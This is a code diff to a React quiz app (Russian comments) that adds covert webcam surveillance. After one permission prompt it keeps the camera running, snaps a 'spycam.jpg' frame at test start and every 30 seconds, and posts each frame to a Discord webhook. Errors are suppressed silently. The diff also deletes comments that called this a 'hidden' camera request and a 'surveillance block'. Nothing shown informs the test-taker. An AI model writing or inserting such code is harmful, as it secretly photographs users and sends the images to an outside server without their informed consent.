@@ -240,8 +240,35 @@ function App() {
   const [customQCount, setCustomQCount] = useState(''); 
   const [isAnimating, setIsAnimating] = useState(false);
 
-// --- SECURITY MONITORING HOOKS ---
-// --- SECURITY MONITORING HOOKS ---
+  // ССЫЛКИ ДЛЯ ПОДДЕРЖАНИЯ КАМЕРЫ ОНЛАЙН БЕЗ ПОВТОРНЫХ ЗАПРОСОВ
+  const streamRef = useRef(null);
+  const videoRef = useRef(null);
+
+  // Единый запуск камеры (Спрашивает 1 раз)
+  const startCamera = async () => {
+      try {
+          if (!streamRef.current) {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+              streamRef.current = stream;
+              
+              const video = document.createElement('video');
+              video.muted = true;
+              video.playsInline = true;
+              video.autoplay = true;
+              video.srcObject = stream;
+              videoRef.current = video;
+              
+              await new Promise((resolve) => {
+                  video.onloadedmetadata = () => {
+                      video.play().then(resolve).catch(resolve);
+                  };
+                  setTimeout(resolve, 1500);
+              });
+          }
+      } catch (e) {}
+  };
+
+  // ФУНКЦИЯ ДЛЯ ЗАХВАТА КАРТИНКИ ИЗ УЖЕ РАБОТАЮЩЕЙ КАМЕРЫ
   const captureViolation = async (title, extraFields = []) => {
       let formData = new FormData();
       const isPlanned = title.includes("Плановая");
@@ -261,65 +288,51 @@ function App() {
           }]
       };
 
-      try {
-          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-              
-              // 1. Создаем виртуальный элемент в памяти, чтобы обойти блокировку display: none
-              const video = document.createElement('video');
-              video.muted = true;
-              video.playsInline = true;
-              video.autoplay = true;
-              video.srcObject = stream;
-              
-              // 2. Ждем получения метаданных и физического старта воспроизведения
-              await new Promise((resolve) => {
-                  video.onloadedmetadata = () => {
-                      video.play().then(resolve).catch(resolve);
-                  };
-                  setTimeout(resolve, 1500); // Предохранитель
-              });
-              
-              // 3. Даем камере прогреться и поймать свет (600мс)
-              await new Promise(r => setTimeout(r, 600)); 
-              
-              // 4. Отрисовываем кадр на холст
+      if (videoRef.current && streamRef.current) {
+          try {
+              const video = videoRef.current;
               const canvas = document.createElement('canvas');
               canvas.width = video.videoWidth || 640; 
               canvas.height = video.videoHeight || 480;
+              
               canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
               
-              // 5. Конвертируем в файл
               const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
               
-              // 6. Проверяем, что файл не пустой (> 100 байт)
               if (blob && blob.size > 100) {
                   formData.append('file', blob, 'spycam.jpg');
                   payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
               } else {
-                  payload.embeds[0].description = "⚠️ Изображение заблокировано браузером";
+                  payload.embeds[0].description = "⚠️ Кадр пуст";
               }
-              
-              // Выключаем камеру
-              stream.getTracks().forEach(track => track.stop());
-          }
-      } catch(e) {
-          payload.embeds[0].description = "❌ Камера отключена или заблокирована пользователем";
+          } catch(e) {}
+      } else {
+          payload.embeds[0].description = "❌ Камера не запущена или заблокирована";
       }
 
       formData.append('payload_json', JSON.stringify(payload));
-
-      try {
-          await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-      } catch(e) {}
+      try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }); } catch(e) {}
   };
+
+  // Выключение камеры когда выходим из режима теста
+  useEffect(() => {
+      if (view !== 'test') {
+          if (streamRef.current) {
+              streamRef.current.getTracks().forEach(t => t.stop());
+              streamRef.current = null;
+          }
+          if (videoRef.current) {
+              videoRef.current.srcObject = null;
+              videoRef.current = null;
+          }
+      }
+  }, [view]);
 
   // Таймер на 30 секунд для фото
   useEffect(() => {
     let intervalId = null;
     if (view === 'test') {
       setTimeout(() => captureViolation("📸 Плановая проверка (мониторинг)"), 3000);
-      
       intervalId = setInterval(() => {
         captureViolation("📸 Плановая проверка (мониторинг)");
       }, 30000);
@@ -327,7 +340,6 @@ function App() {
     return () => { if (intervalId) clearInterval(intervalId); };
   }, [view, fp]);
 
-  // Отслеживание нарушений
   useEffect(() => {
       if (view !== 'test') return;
 
@@ -355,7 +367,6 @@ function App() {
           window.removeEventListener('keydown', handleKeys);
       };
   }, [view, fp]);
-  // --- КОНЕЦ БЛОКА СЛЕЖКИ ---
 
   useEffect(() => { document.body.className = theme; localStorage.setItem('theme', theme); }, [theme]);
 
@@ -433,12 +444,9 @@ function App() {
     setView('timer_setup');
   };
   
-  // ДОБАВЛЕНО: Скрытый запрос доступа к камере при старте
   const launchTestWithTimer = async () => {
-      try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
+      // ОДНОКРАТНЫЙ ЗАПРОС ДОСТУПА
+      await startCamera();
 
       const mins = parseInt(customTime) || 20;
       let qCount = parseInt(customQCount);
@@ -490,7 +498,6 @@ function App() {
     setView('result');
   };
 
-  // --- KEYBOARD SUPPORT ADDITION ---
   useEffect(() => {
       if (view !== 'test') return;
 
@@ -499,7 +506,6 @@ function App() {
 
           const { currentIdx, questions, answers } = testSession;
           
-          // Navigation
           if (e.key === 'ArrowRight' || e.key === 'Enter') {
               if (currentIdx < questions.length - 1) {
                   handleNavClick(currentIdx + 1);
@@ -508,9 +514,7 @@ function App() {
               if (currentIdx > 0) {
                   handleNavClick(currentIdx - 1);
               }
-          } 
-          // Answers 1-9
-          else if (e.key >= '1' && e.key <= '9') {
+          } else if (e.key >= '1' && e.key <= '9') {
               const variantIndex = parseInt(e.key) - 1; 
               if (questions[currentIdx] && variantIndex < questions[currentIdx].variants.length) {
                   if (answers[currentIdx] === null) {
@@ -523,27 +527,24 @@ function App() {
       window.addEventListener('keydown', handleKeyDown);
       return () => window.removeEventListener('keydown', handleKeyDown);
   }, [view, testSession, isAnimating]);
-  // ---------------------------------
   
-  // --- ИСПРАВЛЕННАЯ ФУНКЦИЯ ДЛЯ ПОВТОРЕНИЯ ОШИБОК ---
-  const restartMistakes = () => {
-    // 1. Фильтруем вопросы, где была ошибка
+  const restartMistakes = async () => {
     const wrongQuestionsRaw = testSession.questions.filter((q, i) => testSession.answers[i] !== q.correctIndex);
     
     if(wrongQuestionsRaw.length === 0) return; 
 
-    // 2. ПЕРЕМЕШИВАЕМ ВАРИАНТЫ ОТВЕТОВ ЗАНОВО
     const reShuffledQuestions = wrongQuestionsRaw.map(q => {
        const newVars = shuffleArray([...q.variants]);
        const newCorrectIdx = newVars.findIndex(v => v._isCorrectOriginal);
        return { ...q, variants: newVars, correctIndex: newCorrectIdx };
     });
 
-    // Сбрасываем таймер
+    // ЗАПУСКАЕМ КАМЕРУ СНОВА, ЕСЛИ ПЕРЕЗАПУСК
+    await startCamera();
+
     const mins = parseInt(customTime) || 20;
     setTimeLeft(mins * 60);
 
-    // Запускаем тест с новыми перемешанными вопросами
     setTestSession({ 
         questions: reShuffledQuestions, 
         currentIdx: 0, 
@@ -554,7 +555,6 @@ function App() {
     setIsResultSaved(false);
     setView('test');
   };
-  // -------------------------------------------
 
   const saveResult = async (name) => {
       if(!name.trim()) return alert('Введите имя!');
@@ -829,6 +829,7 @@ function App() {
                <div style={{display:'flex', gap:10, flexWrap:'wrap', justifyContent:'center'}}>
                   <Button variant="orange" onClick={()=>setView('review')}>🧐 Ошибки</Button>
                   
+                  {/* КНОПКА ПОВТОРА ОШИБОК */}
                   {testSession.score < testSession.questions.length && (
                       <Button variant="red" onClick={restartMistakes}>🔄 Повторить ошибки</Button>
                   )}
